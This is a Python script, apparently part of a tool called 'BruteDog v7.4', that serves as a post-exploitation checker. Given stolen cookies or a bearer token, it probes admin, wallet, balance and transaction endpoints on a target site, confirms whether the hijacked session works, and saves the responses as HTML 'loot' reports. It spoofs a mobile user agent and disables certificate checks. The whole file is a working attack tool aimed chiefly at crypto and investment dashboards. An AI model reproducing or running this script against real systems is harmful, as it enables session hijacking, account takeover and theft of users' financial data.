#!/usr/bin/env python3
"""
LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v7.4
Senior Red Team Edition: Structural JSON schema validation & strict negative DOM assertions.
"""
import sys
import os
import time
import json
import httpx
from urllib.parse import urlsplit

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def save_loot_report(endpoint, status, body):
    timestamp = int(time.time())
    filename = f"session_loot_report_{timestamp}.html"
    static_filename = "session_loot_report.html"
    
    # Format cleanly for HTML viewer
    try:
        parsed_json = json.loads(body)
        formatted_body = json.dumps(parsed_json, indent=4)
        is_json = True
    except:
        formatted_body = body
        is_json = False

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BruteDog v7.4 — Verified Session Loot</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem; }}
        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 2rem; max-width: 900px; margin: auto; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }}
        h2 {{ color: #38bdf8; margin-top: 0; }}
        pre {{ background: #090d16; padding: 1rem; border-radius: 6px; overflow-x: auto; color: #34d399; font-size: 14px; }}
        .meta {{ color: #94a3b8; font-size: 0.9rem; margin-bottom: 1rem; background: #0f172a; padding: 0.5rem 1rem; border-radius: 4px; }}
    </style>
</head>
<body>
    <div class="card">
        <h2>🔓 Verified Session Loot / Data Dump</h2>
        <div class="meta"><strong>Endpoint:</strong> {endpoint} | <strong>Status Code:</strong> {status} | <strong>Timestamp:</strong> {timestamp}</div>
        <h3>Payload Response:</h3>
        <pre>{formatted_body}</pre>
    </div>
</body>
</html>
"""
    # Save both timestamped historical report and static viewer filename
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html_content)
        with open(static_filename, "w", encoding="utf-8") as f:
            f.write(html_content)
        log(f"[+] Loot successfully secured and exported to: {filename} & {static_filename}", "\033[92m")
    except Exception as exc:
        log(f"[-] Failed to write loot report files: {exc}", "\033[91m")

    return filename

def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=None, token=None):
    parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
    base_url = f"{parsed.scheme}://{parsed.hostname}"
    if parsed.port:
        base_url += f":{parsed.port}"
    
    probe_endpoints = [
        endpoint,
        "/admin/dashboard",
        "/dashboard",
        "/user/dashboard",
        "/api/user/balance",
        "/user/wallet",
        "/wallet",
        "/api/user/wallet",
        "/api/user/transaction",
        "/user/transaction",
        "transaction",
        "/api/auth/user",
        "/api/dashboard/stats"
    ]
    
    seen = set()
    targets = [e for e in probe_endpoints if not (e in seen or seen.add(e))]

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    if token:
        headers["Authorization"] = f"Bearer {token}"

    cookies = cookie_dict or {}

    with httpx.Client(verify=False, follow_redirects=True, cookies=cookies, timeout=10.0) as client:
        for ep in targets:
            target_endpoint = f"{base_url}{ep}"
            log(f"\n[***] RED TEAM VERIFICATION: Probing {target_endpoint} [***]", "\033[95m")

            try:
                response = client.get(target_endpoint, headers=headers)
                status = response.status_code
                body = response.text.strip()
                content_type = response.headers.get("content-type", "").lower()

                # Rule 1: Check for JSON API Authentication Response (Hard Proof)
                if "application/json" in content_type or body.startswith("{") or body.startswith("["):
                    try:
                        data = json.loads(body)
                        # Look for explicit session/user schema indicators
                        has_user_keys = any(k in data for k in ["user", "token", "access_token", "balance", "wallet", "email"])
                        is_error_payload = data.get("status") == "error" or "message" in data and "unauthorized" in str(data["message"]).lower()
                        
                        if status in [200, 201] and has_user_keys and not is_error_payload:
                            log(f"[!!!] SUCCESS! Verified API Session Loot at {ep} [HTTP {status}] [!!!]", "\033[91m")
                            save_loot_report(ep, status, body)
                            return True
                    except json.JSONDecodeError:
                        pass

                # Rule 2: HTML Response Deep Inspection (Defending against login wrappers)
                is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or len(body) < 150
                
                # Strict login form check: if it contains password input fields or login headings, it's a trap
                has_password_field = 'type="password"' in body.lower() or "input name=\"password\"" in body.lower()
                has_login_terms = any(term in body.lower() for term in ["admin login", "sign in to your account", "login-form", "csrf-token"])
                
                if has_password_field or has_login_terms:
                    log(f"[-] Endpoint {ep} served a login/authentication gate. False positive avoided.", "\033[93m")
                    continue

                # Rule 3: Positive validation for actual dashboard content
                has_real_dashboard_markers = any(term in body.lower() for term in [
                    "total deposit", "wallet balance", "active investment", "crypto balance", "withdrawal history"
                ])

                if status == 200 and not is_spa_shell and has_real_dashboard_markers:
                    log(f"[!!!] SUCCESS! Verified HTML Dashboard Access at {ep} [HTTP {status}] [!!!]", "\033[91m")
                    save_loot_report(ep, status, body)
                    return True
                else:
                    log(f"[-] Endpoint {ep} returned generic state or unauthenticated view (Status {status}).", "\033[93m")

            except Exception as exc:
                log(f"[-] Connection error on {ep}: {exc}", "\033[91m")

    log("[-] Verification sweep complete. No active session loot confirmed on tested routes.", "\033[91m")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 live_login_verifier.py <target_url> [endpoint]")
        sys.exit(1)
    
    target = sys.argv[1]
    ep = sys.argv[2] if len(sys.argv) > 2 else "/admin"

    execute_live_login_verification(target, ep)
